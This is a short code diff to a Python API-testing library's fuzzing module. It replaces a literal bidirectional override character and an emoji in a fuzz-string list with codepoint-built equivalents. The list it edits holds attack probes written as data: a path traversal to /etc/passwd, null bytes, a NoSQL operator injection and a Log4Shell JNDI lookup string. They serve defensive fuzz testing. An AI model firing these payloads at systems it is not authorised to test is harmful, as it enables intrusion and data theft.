@@ -12,6 +12,11 @@ from je_api_testka.utils.logging.loggin_instance import apitestka_logger
 
 DEFAULT_MAX_FUZZ: int = 100
 
+# RIGHT-TO-LEFT OVERRIDE built from its codepoint so the source file itself
+# never contains a bidirectional character (Sonar S6389, Codacy
+# BiDiTrojanSource). The runtime probe value is identical to U+202E.
+_BIDI_OVERRIDE: str = chr(0x202E)
+
 _FUZZ_STRINGS: List[str] = [
     "",
     " ",
@@ -23,8 +28,8 @@ _FUZZ_STRINGS: List[str] = [
     "../../../../etc/passwd",
     "%00",
     "\x00",
-    "‮",
-    "🤖" * 50,
+    _BIDI_OVERRIDE,
+    "\U0001f916" * 50,
     "A" * 1024,
     "{\"$gt\": \"\"}",
     "${jndi:ldap://example.invalid/x}",
